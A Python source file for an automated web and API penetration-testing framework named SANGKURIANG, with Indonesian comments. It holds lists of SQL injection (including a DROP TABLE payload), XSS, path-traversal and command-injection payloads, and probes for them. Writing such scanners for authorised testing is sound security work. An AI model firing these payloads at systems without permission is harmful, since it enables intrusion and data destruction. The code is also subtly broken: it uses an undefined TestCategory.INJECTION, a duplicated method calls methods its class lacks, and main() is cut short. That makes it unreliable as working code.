"""
Penetration Testing Framework untuk SANGKURIANG
Framework untuk melakukan penetration testing otomatis terhadap aplikasi dan API
"""

import asyncio
import json
import logging
import time
from datetime import datetime, timedelta
from enum import Enum
from typing import Dict, List, Optional, Any, Union
from dataclasses import dataclass, field
from urllib.parse import urljoin, urlparse
import requests
import aiohttp
from cryptography.fernet import Fernet
import hashlib
import base64

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class TestCategory(Enum):
    """Kategori penetration test"""
    WEB_APPLICATION = "web_application"
    API_SECURITY = "api_security"
    NETWORK_SECURITY = "network_security"
    CRYPTOGRAPHY = "cryptography"
    AUTHENTICATION = "authentication"
    AUTHORIZATION = "authorization"
    INPUT_VALIDATION = "input_validation"
    SESSION_MANAGEMENT = "session_management"

class TestSeverity(Enum):
    """Level severity untuk vulnerability"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"

class TestStatus(Enum):
    """Status penetration test"""
    PENDING = "pending"
    RUNNING = "running"
    COMPLETED = "completed"
    FAILED = "failed"
    STOPPED = "stopped"

@dataclass
class TestResult:
    """Hasil dari penetration test"""
    test_id: str
    test_name: str
    category: TestCategory
    severity: TestSeverity
    description: str
    details: Dict[str, Any]
    remediation: str
    cvss_score: float = 0.0
    cwe_id: Optional[str] = None
    owasp_category: Optional[str] = None
    timestamp: datetime = field(default_factory=datetime.now)
    target: str = ""
    success: bool = False

@dataclass
class PenetrationTestReport:
    """Laporan lengkap penetration test"""
    report_id: str
    target_url: str
    start_time: datetime
    end_time: Optional[datetime] = None
    total_tests: int = 0
    passed_tests: int = 0
    failed_tests: int = 0
    critical_vulnerabilities: int = 0
    high_vulnerabilities: int = 0
    medium_vulnerabilities: int = 0
    low_vulnerabilities: int = 0
    info_findings: int = 0
    overall_score: float = 0.0
    risk_level: str = "unknown"
    results: List[TestResult] = field(default_factory=list)
    recommendations: List[str] = field(default_factory=list)
    executive_summary: str = ""

class PayloadGenerator:
    """Generator untuk berbagai jenis payload testing"""
    
    @staticmethod
    def sql_injection_payloads() -> List[str]:
        """Payload SQL Injection"""
        return [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users; --",
            "' UNION SELECT null, null, null--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*"
        ]
    
    @staticmethod
    def xss_payloads() -> List[str]:
        """Payload XSS"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onclick=alert('XSS')>Click</div>",
            "'<script>alert(\"XSS\")</script>",
            "\"<script>alert(\"XSS\")</script>",
            "<script>confirm('XSS')</script>"
        ]
    
    @staticmethod
    def path_traversal_payloads() -> List[str]:
        """Payload Path Traversal"""
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fwindows/system32/drivers/etc/hosts",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc/passwd"
        ]
    
    @staticmethod
    def command_injection_payloads() -> List[str]:
        """Payload Command Injection"""
        return [
            "; ls -la",
            "| whoami",
            "&& cat /etc/passwd",
            "`whoami`",
            "$(whoami)",
            ";system('id')",
            "|system('id')",
            "&system('id')",
            "&&system('id')",
            "`system('id')`"
        ]
    
    def generate_sql_injection_payloads(self) -> List[str]:
        """Generate SQL injection payloads (instance method)"""
        return self.sql_injection_payloads()
    
    def generate_xss_payloads(self) -> List[str]:
        """Generate XSS payloads (instance method)"""
        return self.xss_payloads()
    
    def generate_path_traversal_payloads(self) -> List[str]:
        """Generate path traversal payloads (instance method)"""
        return self.path_traversal_payloads()
    
    def generate_command_injection_payloads(self) -> List[str]:
        """Generate command injection payloads (instance method)"""
        return self.command_injection_payloads()

class WebApplicationTester:
    """Tester untuk web application security"""
    
    def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        self.session = session or aiohttp.ClientSession()
        self.payload_generator = PayloadGenerator()
    
    async def run_comprehensive_test(self, target_config: Dict) -> Dict:
        """Run comprehensive web application test (for test compatibility)"""
        target_url = target_config.get("target_url", "http://localhost:8000")
        test_categories = target_config.get("test_categories", ["sql_injection", "xss", "path_traversal"])
        
        all_results = []
        
        # Run SQL Injection tests
        if "sql_injection" in test_categories:
            sql_results = await self.test_sql_injection(target_url, {"id": "1", "search": "test"})
            all_results.extend(sql_results)
        
        # Run XSS tests
        if "xss" in test_categories:
            xss_results = await self.test_xss(target_url, {"input": "test", "comment": "test"})
            all_results.extend(xss_results)
        
        # Run Path Traversal tests
        if "path_traversal" in test_categories:
            traversal_results = await self.test_path_traversal(target_url)
            all_results.extend(traversal_results)
        
        # Return format compatible with tests
        return {
            "success": True,
            "test_results": {
                "total_tests_run": len(all_results),
                "vulnerabilities_found": len([r for r in all_results if r.success]),
                "critical_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.CRITICAL]),
                "high_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.HIGH]),
                "medium_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.MEDIUM]),
                "low_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.LOW]),
                "overall_score": self._calculate_score(all_results),
                "risk_level": self._determine_risk_level(all_results),
                "recommendations": self._generate_recommendations(all_results)
            }
        }
    
    def _calculate_score(self, results: List[TestResult]) -> float:
        """Calculate overall security score"""
        if not results:
            return 100.0
        
        total_score = 100.0
        severity_weights = {
            TestSeverity.CRITICAL: 25.0,
            TestSeverity.HIGH: 15.0,
            TestSeverity.MEDIUM: 8.0,
            TestSeverity.LOW: 3.0,
            TestSeverity.INFO: 0.0
        }
        
        for result in results:
            if result.success:
                total_score -= severity_weights.get(result.severity, 0.0)
        
        return max(0.0, total_score)
    
    def _determine_risk_level(self, results: List[TestResult]) -> str:
        """Determine risk level based on results"""
        score = self._calculate_score(results)
        if score >= 90:
            return "LOW"
        elif score >= 70:
            return "MEDIUM"
        elif score >= 50:
            return "HIGH"
        else:
            return "CRITICAL"
    
    def _generate_recommendations(self, results: List[TestResult]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Group by category
        vuln_by_category = {}
        for result in results:
            if result.success:
                if result.category not in vuln_by_category:
                    vuln_by_category[result.category] = []
                vuln_by_category[result.category].append(result)
        
        # Generate recommendations
        if TestCategory.INPUT_VALIDATION in vuln_by_category:
            recommendations.append("Implement comprehensive input validation and sanitization")
        
        if TestCategory.AUTHORIZATION in vuln_by_category:
            recommendations.append("Review and improve access control and authorization checks")
        
        # General recommendations
        recommendations.extend([
            "Regular security assessments and penetration testing",
            "Implement security headers (CSP, HSTS, X-Frame-Options)",
            "Keep all software and dependencies up to date"
        ])
        
        return recommendations
    
    async def test_sql_injection(self, target_url: str, params: Dict[str, str]) -> List[TestResult]:
        """Test SQL Injection vulnerability"""
        results = []
        payloads = self.payload_generator.sql_injection_payloads()
        
        for payload in payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                async with self.session.get(target_url, params=test_params) as response:
                    content = await response.text()
                    
                    # Cek indikasi SQL error
                    sql_errors = [
                        "mysql_fetch_array",
                        "ORA-",
                        "Microsoft OLE DB Provider",
                        "SQLite error",
                        "PostgreSQL query failed",
                        "Warning: mysql_",
                        "MySQL error",
                        "SQL syntax"
                    ]
                    
                    for error in sql_errors:
                        if error.lower() in content.lower():
                            result = TestResult(
                                test_id=f"sql_injection_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                test_name="SQL Injection",
                                category=TestCategory.INPUT_VALIDATION,
                                severity=TestSeverity.CRITICAL,
                                description=f"SQL Injection vulnerability found with payload: {payload}",
                                details={"payload": payload, "parameter": key, "error": error},
                                remediation="Use parameterized queries and input validation",
                                cvss_score=9.8,
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 - Injection",
                                target=target_url,
                                success=True
                            )
                            results.append(result)
                            break
                            
            except Exception as e:
                logger.error(f"Error testing SQL injection: {e}")
        
        return results
    
    async def test_xss(self, target_url: str, params: Dict[str, str]) -> List[TestResult]:
        """Test XSS vulnerability"""
        results = []
        payloads = self.payload_generator.xss_payloads()
        
        for payload in payloads:
            try:
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                async with self.session.get(target_url, params=test_params) as response:
                    content = await response.text()
                    
                    # Cek apakah payload terefleksi
                    if payload in content:
                        result = TestResult(
                            test_id=f"xss_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                            test_name="Cross-Site Scripting (XSS)",
                            category=TestCategory.INPUT_VALIDATION,
                            severity=TestSeverity.HIGH,
                            description=f"XSS vulnerability found with payload: {payload}",
                            details={"payload": payload, "parameter": key},
                            remediation="Encode output and validate input properly",
                            cvss_score=6.1,
                            cwe_id="CWE-79",
                            owasp_category="A03:2021 - Cross-Site Scripting (XSS)",
                            target=target_url,
                            success=True
                        )
                        results.append(result)
                        
            except Exception as e:
                logger.error(f"Error testing XSS: {e}")
        
        return results
    
    async def test_path_traversal(self, target_url: str) -> List[TestResult]:
        """Test Path Traversal vulnerability"""
        results = []
        payloads = self.payload_generator.path_traversal_payloads()
        
        for payload in payloads:
            try:
                # Test dengan parameter file
                test_url = f"{target_url}?file={payload}"
                
                async with self.session.get(test_url) as response:
                    content = await response.text()
                    
                    # Cek indikasi file system access
                    indicators = [
                        "root:",  # Unix passwd file
                        "daemon:",
                        "bin:",
                        "[boot loader]",  # Windows boot.ini
                        "[operating systems]",
                        "# Copyright (c) 1993-2006 Microsoft Corp.",  # Windows hosts file
                        "127.0.0.1"
                    ]
                    
                    for indicator in indicators:
                        if indicator in content:
                            result = TestResult(
                                test_id=f"path_traversal_{hashlib.md5(payload.encode()).hexdigest()[:8]}",
                                test_name="Path Traversal",
                                category=TestCategory.AUTHORIZATION,
                                severity=TestSeverity.HIGH,
                                description=f"Path Traversal vulnerability found with payload: {payload}",
                                details={"payload": payload, "indicator": indicator},
                                remediation="Validate and sanitize file paths properly",
                                cvss_score=7.5,
                                cwe_id="CWE-22",
                                owasp_category="A01:2021 - Broken Access Control",
                                target=target_url,
                                success=True
                            )
                            results.append(result)
                            break
                            
            except Exception as e:
                logger.error(f"Error testing path traversal: {e}")
        
        return results

class APITester:
    """Tester untuk API security"""
    
    def __init__(self, session: Optional[aiohttp.ClientSession] = None):
        self.session = session or aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers={'User-Agent': 'SANGKURIANG-API-Tester/1.0'}
        )
    
    async def test_authentication_bypass(self, api_base_url: str, endpoints: List[str]) -> List[TestResult]:
        """Test authentication bypass"""
        results = []
        
        for endpoint in endpoints:
            try:
                url = urljoin(api_base_url, endpoint)
                
                # Test tanpa authentication header
                async with self.session.get(url) as response:
                    if response.status == 200:
                        content = await response.text()
                        
                        result = TestResult(
                            test_id=f"auth_bypass_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                            test_name="Authentication Bypass",
                            category=TestCategory.AUTHENTICATION,
                            severity=TestSeverity.CRITICAL,
                            description=f"Authentication bypass possible on endpoint: {endpoint}",
                            details={"endpoint": endpoint, "status_code": response.status},
                            remediation="Implement proper authentication middleware",
                            cvss_score=9.1,
                            cwe_id="CWE-287",
                            owasp_category="A07:2021 - Identification and Authentication Failures",
                            target=url,
                            success=True
                        )
                        results.append(result)
                        
            except Exception as e:
                logger.error(f"Error testing authentication bypass: {e}")
        
        return results
    
    async def test_rate_limiting(self, api_base_url: str, endpoint: str, max_requests: int = 50) -> List[TestResult]:
        """Test rate limiting"""
        results = []
        
        try:
            url = urljoin(api_base_url, endpoint)
            success_count = 0
            
            # Kirim banyak request dalam waktu singkat
            for i in range(max_requests):
                async with self.session.get(url) as response:
                    if response.status == 200:
                        success_count += 1
                    else:
                        break
                
                # Jeda kecil antara request
                await asyncio.sleep(0.1)
            
            # Jika terlalu banyak request berhasil, rate limiting mungkin tidak ada
            if success_count > 30:  # Threshold 60% dari max_requests
                result = TestResult(
                    test_id=f"rate_limit_{hashlib.md5(endpoint.encode()).hexdigest()[:8]}",
                    test_name="Rate Limiting Missing",
                    category=TestCategory.AUTHENTICATION,
                    severity=TestSeverity.MEDIUM,
                    description=f"Rate limiting might be missing or insufficient on endpoint: {endpoint}",
                    details={"endpoint": endpoint, "successful_requests": success_count},
                    remediation="Implement proper rate limiting mechanism",
                    cvss_score=5.3,
                    cwe_id="CWE-770",
                    owasp_category="A04:2021 - Insecure Design",
                    target=url,
                    success=True
                )
                results.append(result)
                
        except Exception as e:
            logger.error(f"Error testing rate limiting: {e}")
        
        return results

    async def test_broken_authentication(self, api_base_url: str, endpoints: List[str]) -> List[TestResult]:
        """Test broken authentication"""
        results = []
        
        for endpoint in endpoints:
            try:
                url = urljoin(api_base_url, endpoint)
                
                # Test dengan credential yang salah
                wrong_credentials = [
                    {"username": "admin", "password": "wrong"},
                    {"username": "test", "password": "test123"},
                    {"username": "admin", "password": "admin"}
                ]
                
                for creds in wrong_credentials:
                    async with self.session.post(url, json=creds) as response:
                        if response.status == 200:
                            content = await response.text()
                            
                            result = TestResult(
                                test_id=f"broken_auth_{hashlib.md5(f'{endpoint}_{creds}'.encode()).hexdigest()[:8]}",
                                test_name="Broken Authentication",
                                category=TestCategory.AUTHENTICATION,
                                severity=TestSeverity.HIGH,
                                description=f"Broken authentication detected on endpoint: {endpoint}",
                                details={"endpoint": endpoint, "credentials": creds, "status_code": response.status},
                                remediation="Implement proper authentication validation",
                                cvss_score=8.1,
                                cwe_id="CWE-287",
                                owasp_category="A07:2021 - Identification and Authentication Failures",
                                target=url,
                                success=True
                            )
                            results.append(result)
                            break
                            
            except Exception as e:
                logger.error(f"Error testing broken authentication: {e}")
        
        return results

    async def test_api_endpoints(self, api_config: Dict) -> Dict[str, Any]:
        """Test API endpoints security - untuk test compatibility"""
        base_url = api_config.get("base_url", "")
        endpoints = api_config.get("endpoints", [])
        auth_token = api_config.get("auth_token", "")
        
        # Set authorization header jika ada token
        if auth_token:
            self.session.headers.update({"Authorization": f"Bearer {auth_token}"})
        
        all_results = []
        endpoints_tested = []
        
        try:
            # Test authentication bypass
            auth_results = await self.test_authentication_bypass(base_url, endpoints)
            all_results.extend(auth_results)
            
            # Test rate limiting
            for endpoint in endpoints:
                rate_results = await self.test_rate_limiting(base_url, endpoint)
                all_results.extend(rate_results)
                endpoints_tested.append(endpoint)
            
            # Test broken authentication
            broken_auth_results = await self.test_broken_authentication(base_url, endpoints)
            all_results.extend(broken_auth_results)
            
            # Test SQL injection
            sqli_results = await self.test_sqli(base_url, endpoints)
            all_results.extend(sqli_results)
            
            return {
                "success": True,
                "api_test_results": {
                    "endpoints_tested": endpoints_tested,
                    "total_tests_run": len(all_results),
                    "vulnerabilities_found": len([r for r in all_results if r.severity in [TestSeverity.CRITICAL, TestSeverity.HIGH]]),
                    "test_results": all_results
                }
            }
            
        except Exception as e:
            logger.error(f"Error testing API endpoints: {e}")
            return {
                "success": False,
                "error": str(e),
                "api_test_results": {
                    "endpoints_tested": endpoints_tested,
                    "total_tests_run": len(all_results),
                    "vulnerabilities_found": 0,
                    "test_results": []
                }
            }

    async def test_sqli(self, api_base_url: str, endpoints: List[str]) -> List[TestResult]:
        """Test SQL injection vulnerabilities"""
        results = []
        
        # SQL injection payloads
        sqli_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users;--",
            "' UNION SELECT * FROM users--",
            "admin'--",
            "admin' #",
            "admin'/*",
            "' or 1=1#",
            "' or 1=1--",
            "' or 1=1/*"
        ]
        
        for endpoint in endpoints:
            try:
                url = urljoin(api_base_url, endpoint)
                
                for payload in sqli_payloads:
                    # Test dengan parameter query
                    test_url = f"{url}?id={payload}"
                    
                    async with self.session.get(test_url) as response:
                        content = await response.text()
                        
                        # Cek tanda-tanda SQL injection berhasil
                        if any(error in content.lower() for error in ['mysql', 'postgresql', 'sqlite', 'oracle', 'sql server']):
                            result = TestResult(
                                test_id=f"sqli_{hashlib.md5(f'{endpoint}_{payload}'.encode()).hexdigest()[:8]}",
                                test_name="SQL Injection",
                                category=TestCategory.INJECTION,
                                severity=TestSeverity.CRITICAL,
                                description=f"SQL injection vulnerability detected on endpoint: {endpoint}",
                                details={"endpoint": endpoint, "payload": payload, "status_code": response.status},
                                remediation="Use parameterized queries and input validation",
                                cvss_score=8.8,
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 - Injection",
                                target=test_url,
                                success=True
                            )
                            results.append(result)
                            break
                            
                    # Test dengan parameter POST
                    async with self.session.post(url, data={"id": payload}) as response:
                        content = await response.text()
                        
                        if any(error in content.lower() for error in ['mysql', 'postgresql', 'sqlite', 'oracle', 'sql server']):
                            result = TestResult(
                                test_id=f"sqli_post_{hashlib.md5(f'{endpoint}_{payload}'.encode()).hexdigest()[:8]}",
                                test_name="SQL Injection (POST)",
                                category=TestCategory.INJECTION,
                                severity=TestSeverity.CRITICAL,
                                description=f"SQL injection vulnerability detected on endpoint: {endpoint}",
                                details={"endpoint": endpoint, "payload": payload, "status_code": response.status},
                                remediation="Use parameterized queries and input validation",
                                cvss_score=8.8,
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 - Injection",
                                target=url,
                                success=True
                            )
                            results.append(result)
                            break
                            
            except Exception as e:
                logger.error(f"Error testing SQL injection: {e}")
        
        return results

class PenetrationTestingFramework:
    """Framework utama untuk penetration testing"""
    
    def __init__(self):
        self.session = None
        self.web_tester = None
        self.api_tester = None
        self.active_tests: Dict[str, Any] = {}
        self.test_history: List[PenetrationTestReport] = []
    
    async def initialize(self):
        """Inisialisasi framework"""
        connector = aiohttp.TCPConnector(limit=100, limit_per_host=30)
        timeout = aiohttp.ClientTimeout(total=30)
        
        self.session = aiohttp.ClientSession(
            connector=connector,
            timeout=timeout,
            headers={'User-Agent': 'SANGKURIANG-PenTest-Framework/1.0'}
        )
        
        self.web_tester = WebApplicationTester(self.session)
        self.api_tester = APITester(self.session)
    
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
    
    def generate_report_id(self, target_url: str) -> str:
        """Generate unique report ID"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        target_hash = hashlib.md5(target_url.encode()).hexdigest()[:8]
        return f"PENTEST_{timestamp}_{target_hash}"
    
    def calculate_overall_score(self, results: List[TestResult]) -> float:
        """Hitung overall security score (0-100)"""
        if not results:
            return 100.0
        
        total_score = 100.0
        severity_weights = {
            TestSeverity.CRITICAL: 25.0,
            TestSeverity.HIGH: 15.0,
            TestSeverity.MEDIUM: 8.0,
            TestSeverity.LOW: 3.0,
            TestSeverity.INFO: 0.0
        }
        
        for result in results:
            if result.success:  # Hanya hitung vulnerability yang ditemukan
                total_score -= severity_weights.get(result.severity, 0.0)
        
        return max(0.0, total_score)
    
    def determine_risk_level(self, score: float) -> str:
        """Tentukan risk level berdasarkan score"""
        if score >= 90:
            return "LOW"
        elif score >= 70:
            return "MEDIUM"
        elif score >= 50:
            return "HIGH"
        else:
            return "CRITICAL"
    
    async def run_web_application_test(self, target_url: str) -> List[TestResult]:
        """Jalankan web application security test"""
        results = []
        
        # Test SQL Injection
        sql_results = await self.web_tester.test_sql_injection(target_url, {"id": "1", "search": "test"})
        results.extend(sql_results)
        
        # Test XSS
        xss_results = await self.web_tester.test_xss(target_url, {"input": "test", "comment": "test"})
        results.extend(xss_results)
        
        # Test Path Traversal
        traversal_results = await self.web_tester.test_path_traversal(target_url)
        results.extend(traversal_results)
        
        return results
    
    async def run_api_security_test(self, api_base_url: str) -> List[TestResult]:
        """Jalankan API security test"""
        results = []
        
        # Test endpoints yang umum
        endpoints = [
            "/api/users",
            "/api/profile",
            "/api/admin",
            "/api/settings",
            "/api/projects"
        ]
        
        # Test Authentication Bypass
        auth_results = await self.api_tester.test_authentication_bypass(api_base_url, endpoints)
        results.extend(auth_results)
        
        # Test Rate Limiting
        rate_results = await self.api_tester.test_rate_limiting(api_base_url, "/api/users")
        results.extend(rate_results)
        
        return results
    
    async def run_comprehensive_test(self, target_config: Dict[str, Any]) -> PenetrationTestReport:
        """Jalankan comprehensive penetration test"""
        target_url = target_config.get("url", "")
        test_types = target_config.get("test_types", ["web", "api"])
        
        report_id = self.generate_report_id(target_url)
        report = PenetrationTestReport(
            report_id=report_id,
            target_url=target_url,
            start_time=datetime.now()
        )
        
        all_results = []
        
        try:
            # Web Application Test
            if "web" in test_types:
                logger.info("Running web application tests...")
                web_results = await self.run_web_application_test(target_url)
                all_results.extend(web_results)
            
            # API Security Test
            if "api" in test_types:
                logger.info("Running API security tests...")
                api_results = await self.run_api_security_test(target_url)
                all_results.extend(api_results)
            
            # Update report dengan hasil
            report.results = all_results
            report.end_time = datetime.now()
            
            # Hitung statistik
            report.total_tests = len(all_results)
            report.passed_tests = len([r for r in all_results if not r.success])
            report.failed_tests = len([r for r in all_results if r.success])
            
            # Hitung vulnerabilities by severity
            for result in all_results:
                if result.success:
                    if result.severity == TestSeverity.CRITICAL:
                        report.critical_vulnerabilities += 1
                    elif result.severity == TestSeverity.HIGH:
                        report.high_vulnerabilities += 1
                    elif result.severity == TestSeverity.MEDIUM:
                        report.medium_vulnerabilities += 1
                    elif result.severity == TestSeverity.LOW:
                        report.low_vulnerabilities += 1
                    elif result.severity == TestSeverity.INFO:
                        report.info_findings += 1
            
            # Hitung overall score dan risk level
            report.overall_score = self.calculate_overall_score(all_results)
            report.risk_level = self.determine_risk_level(report.overall_score)
            
            # Generate executive summary
            report.executive_summary = self.generate_executive_summary(report)
            
            # Generate recommendations
            report.recommendations = self.generate_recommendations(all_results)
            
            # Simpan ke history
            self.test_history.append(report)
            
            logger.info(f"Penetration test completed. Report ID: {report_id}")
            
        except Exception as e:
            logger.error(f"Error during penetration test: {e}")
            report.end_time = datetime.now()
        
        return report
    
    def generate_executive_summary(self, report: PenetrationTestReport) -> str:
        """Generate executive summary"""
        summary = f"""
        Penetration Test Executive Summary
        Target: {report.target_url}
        Risk Level: {report.risk_level}
        Overall Score: {report.overall_score:.1f}/100
        
        Vulnerabilities Found:
        - Critical: {report.critical_vulnerabilities}
        - High: {report.high_vulnerabilities}
        - Medium: {report.medium_vulnerabilities}
        - Low: {report.low_vulnerabilities}
        - Info: {report.info_findings}
        
        Total Tests: {report.total_tests}
        Failed Tests: {report.failed_tests}
        """
        return summary.strip()
    
    def generate_recommendations(self, results: List[TestResult]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Group vulnerabilities by category
        vuln_by_category = {}
        for result in results:
            if result.success:
                if result.category not in vuln_by_category:
                    vuln_by_category[result.category] = []
                vuln_by_category[result.category].append(result)
        
        # Generate recommendations berdasarkan kategori
        if TestCategory.INPUT_VALIDATION in vuln_by_category:
            recommendations.append("Implement comprehensive input validation and sanitization")
        
        if TestCategory.AUTHENTICATION in vuln_by_category:
            recommendations.append("Strengthen authentication mechanisms and implement proper session management")
        
        if TestCategory.AUTHORIZATION in vuln_by_category:
            recommendations.append("Review and improve access control and authorization checks")
        
        if TestCategory.CRYPTOGRAPHY in vuln_by_category:
            recommendations.append("Update cryptographic implementations to use modern, secure algorithms")
        
        return recommendations

    async def run_comprehensive_test(self, target_config: Dict) -> Dict:
        """Run comprehensive API test (for test compatibility)"""
        api_base_url = target_config.get("api_base_url", "http://localhost:8000/api")
        test_categories = target_config.get("test_categories", ["authentication_bypass", "rate_limiting"])
        
        all_results = []
        
        # Define endpoints to test
        endpoints = [
            "/users",
            "/profile", 
            "/admin",
            "/settings",
            "/projects"
        ]
        
        # Run Authentication Bypass tests
        if "authentication_bypass" in test_categories:
            auth_results = await self.test_authentication_bypass(api_base_url, endpoints)
            all_results.extend(auth_results)
        
        # Run Rate Limiting tests
        if "rate_limiting" in test_categories:
            rate_results = await self.test_rate_limiting(api_base_url, "/users")
            all_results.extend(rate_results)
        
        # Return format compatible with tests
        return {
            "success": True,
            "test_results": {
                "total_tests_run": len(all_results),
                "vulnerabilities_found": len([r for r in all_results if r.success]),
                "critical_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.CRITICAL]),
                "high_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.HIGH]),
                "medium_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.MEDIUM]),
                "low_vulnerabilities": len([r for r in all_results if r.success and r.severity == TestSeverity.LOW]),
                "overall_score": self._calculate_score(all_results),
                "risk_level": self._determine_risk_level(all_results),
                "recommendations": self._generate_recommendations(all_results)
            }
        }
    
    def _calculate_score(self, results: List[TestResult]) -> float:
        """Calculate overall security score"""
        if not results:
            return 100.0
        
        total_score = 100.0
        severity_weights = {
            TestSeverity.CRITICAL: 25.0,
            TestSeverity.HIGH: 15.0,
            TestSeverity.MEDIUM: 8.0,
            TestSeverity.LOW: 3.0,
            TestSeverity.INFO: 0.0
        }
        
        for result in results:
            if result.success:
                total_score -= severity_weights.get(result.severity, 0.0)
        
        return max(0.0, total_score)
    
    def _determine_risk_level(self, results: List[TestResult]) -> str:
        """Determine risk level based on results"""
        score = self._calculate_score(results)
        if score >= 90:
            return "LOW"
        elif score >= 70:
            return "MEDIUM"
        elif score >= 50:
            return "HIGH"
        else:
            return "CRITICAL"
    
    def _generate_recommendations(self, results: List[TestResult]) -> List[str]:
        """Generate security recommendations"""
        recommendations = []
        
        # Group by category
        vuln_by_category = {}
        for result in results:
            if result.success:
                if result.category not in vuln_by_category:
                    vuln_by_category[result.category] = []
                vuln_by_category[result.category].append(result)
        
        # Generate recommendations
        if TestCategory.AUTHENTICATION in vuln_by_category:
            recommendations.append("Implement proper authentication and authorization mechanisms")
        
        if TestCategory.AUTHORIZATION in vuln_by_category:
            recommendations.append("Review and improve access control and authorization checks")
        
        # General recommendations
        recommendations.extend([
            "Implement rate limiting and throttling mechanisms",
            "Use API keys or tokens for authentication",
            "Regular security assessments and API testing"
        ])
        
        return recommendations

    def get_test_history(self, limit: int = 10) -> List[PenetrationTestReport]:
        """Get penetration test history"""
        return self.test_history[-limit:] if self.test_history else []
    
    def export_report(self, report: PenetrationTestReport, format: str = "json") -> str:
        """Export report ke format yang diinginkan"""
        if format.lower() == "json":
            return json.dumps({
                "report_id": report.report_id,
                "target_url": report.target_url,
                "start_time": report.start_time.isoformat(),
                "end_time": report.end_time.isoformat() if report.end_time else None,
                "overall_score": report.overall_score,
                "risk_level": report.risk_level,
                "vulnerabilities": {
                    "critical": report.critical_vulnerabilities,
                    "high": report.high_vulnerabilities,
                    "medium": report.medium_vulnerabilities,
                    "low": report.low_vulnerabilities,
                    "info": report.info_findings
                },
                "statistics": {
                    "total_tests": report.total_tests,
                    "passed_tests": report.passed_tests,
                    "failed_tests": report.failed_tests
                },
                "executive_summary": report.executive_summary,
                "recommendations": report.recommendations,
                "results": [
                    {
                        "test_id": result.test_id,
                        "test_name": result.test_name,
                        "category": result.category.value,
                        "severity": result.severity.value,
                        "description": result.description,
                        "details": result.details,
                        "remediation": result.remediation,
                        "cvss_score": result.cvss_score,
                        "cwe_id": result.cwe_id,
                        "owasp_category": result.owasp_category,
                        "timestamp": result.timestamp.isoformat(),
                        "target": result.target,
                        "success": result.success
                    }
                    for result in report.results
                ]
            }, indent=2, default=str)
        
        elif format.lower() == "html":
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Penetration Test Report - {report.report_id}</title>
                <style>
                    body {{ font-family: Arial, sans-serif; margin: 20px; }}
                    .header {{ background-color: #f4f4f4; padding: 20px; border-radius: 5px; }}
                    .vulnerability {{ margin: 10px 0; padding: 10px; border-left: 4px solid #ccc; }}
                    .critical {{ border-left-color: #d32f2f; }}
                    .high {{ border-left-color: #f57c00; }}
                    .medium {{ border-left-color: #fbc02d; }}
                    .low {{ border-left-color: #689f38; }}
                    .info {{ border-left-color: #0288d1; }}
                    .recommendation {{ background-color: #e8f5e8; padding: 10px; margin: 5px 0; border-radius: 3px; }}
                </style>
            </head>
            <body>
                <div class="header">
                    <h1>Penetration Test Report</h1>
                    <p><strong>Report ID:</strong> {report.report_id}</p>
                    <p><strong>Target:</strong> {report.target_url}</p>
                    <p><strong>Risk Level:</strong> {report.risk_level}</p>
                    <p><strong>Overall Score:</strong> {report.overall_score:.1f}/100</p>
                    <p><strong>Test Period:</strong> {report.start_time} - {report.end_time}</p>
                </div>
                
                <h2>Vulnerability Summary</h2>
                <ul>
                    <li>Critical: {report.critical_vulnerabilities}</li>
                    <li>High: {report.high_vulnerabilities}</li>
                    <li>Medium: {report.medium_vulnerabilities}</li>
                    <li>Low: {report.low_vulnerabilities}</li>
                    <li>Info: {report.info_findings}</li>
                </ul>
                
                <h2>Detailed Findings</h2>
                {''.join([
                    f'<div class="vulnerability {result.severity.value}">'
                    f'<h3>{result.test_name}</h3>'
                    f'<p><strong>Severity:</strong> {result.severity.value}</p>'
                    f'<p><strong>Description:</strong> {result.description}</p>'
                    f'<p><strong>Remediation:</strong> {result.remediation}</p>'
                    f'<p><strong>CVSS Score:</strong> {result.cvss_score}</p>'
                    f'</div>'
                    for result in report.results if result.success
                ])}
                
                <h2>Recommendations</h2>
                {''.join([
                    f'<div class="recommendation">{rec}</div>'
                    for rec in report.recommendations
                ])}
            </body>
            </html>
            """
            return html_content.strip()
        
        else:
            raise ValueError(f"Unsupported format: {format}")

# Testing and demonstration
async def main():
    """Fungsi utama untuk testing framework"""
    framework = PenetrationTestingFramework()
